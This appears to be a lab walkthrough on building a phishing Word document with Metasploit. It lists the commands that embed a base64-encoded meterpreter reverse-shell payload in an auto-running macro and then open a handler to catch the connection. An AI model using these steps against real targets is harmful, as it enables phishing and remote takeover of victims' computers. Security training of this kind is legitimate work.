**Creating a new document**

- Open a new terminal window and run **`msfconsole`** to start the Metasploit Framework
- **`set payload windows/meterpreter/reverse_tcp`** specifies the payload to use; in this case, it connects to the specified host and creates a reverse shell
- **`use exploit/multi/fileformat/office_word_macro`** specifies the exploit you want to use. It is a module to create a document with a macro
- **`set LHOST CONNECTION_IP`** specifies the IP address of the attacker’s system, **`CONNECTION_IP`** in this case is the IP of the target
- **`set LPORT 8888`** specifies the port number you are going to listen on for incoming connections on the target
- **`show options`** shows the configuration options to ensure that everything has been set properly, i.e., the IP address and port number in this example
- **`exploit`** generates a macro and embeds it in a document
- **`exit`** to quit and return to the terminal

![10SS01](https://github.com/user-attachments/assets/c5da065f-c937-4b5e-a2cc-3463b92cdca5)
![10SS02](https://github.com/user-attachments/assets/9441fb59-96f3-404d-9593-bc1627ad7410)
![10SS03](https://github.com/user-attachments/assets/4a733834-d044-4355-aa88-c3ae69f8d766)


Word document with the embedded macro was created and stored in `~/user/.msf/local/msf.docm`

![10image01](https://github.com/user-attachments/assets/958268ad-eadd-4c42-9cca-206383fd6838)

1. **`AutoOpen()`** triggers the macro automatically when a Word document is opened. It searches through the document’s properties, looking for content in the “Comments” field. The data saved using **`base64`** encoding in the Comments field is actually the payload.
2. **`Base64Decode()`** converts the payload to its original form. In this case, it is an executable MS Windows file.
3. **`ExecuteForWindows()`** executes the payload in a temporary directory. It connects to the specified attacker’s system IP address and port.

The **Comments** field is shown in the screenshot below. It is close to 100,000 characters in our case.

![10image02](https://github.com/user-attachments/assets/1c35f557-36a6-45da-8f2f-8de6adac174c)

If you copy it and save it to a text file, you can convert it to its original executable format using **`base64`** as shown below. You can notice the size of the files.

![10image03](https://github.com/user-attachments/assets/877cf6e0-d221-4f81-8971-9db105c179bf)

Running a check on VirusTotal report

![10image04](https://github.com/user-attachments/assets/0ca5a053-423a-417f-a70d-47209edfa28f)

**Listening for connection**

- Open a new terminal window and run **`msfconsole`** to start the Metasploit Framework
- **`use multi/handler`** to handle incoming connections
- **`set payload windows/meterpreter/reverse_tcp`** to ensure that our payload works with the payload used when creating the malicious macro
- **`set LHOST CONNECTION_IP`** specifies the IP address of the attacker’s system and should be the same as the one used when creating the document
- **`set LPORT 8888`** specifies the port number you are going to listen on and should be the same as the one used when creating the document
- **`show options`** to confirm the values of your options
- **`exploit`** starts listening for incoming connections to establish a reverse shell
  
![10SS04](https://github.com/user-attachments/assets/cd0449e8-e669-4926-a285-b1d13233ae8c)
![10SS05](https://github.com/user-attachments/assets/ca665db3-a548-45a1-893c-86afaabd0e24)
![10SS08](https://github.com/user-attachments/assets/640b7623-d446-4aec-b8da-c5e77a27e93d)

(Forgot to take a screenshot, hence saved one from the page)
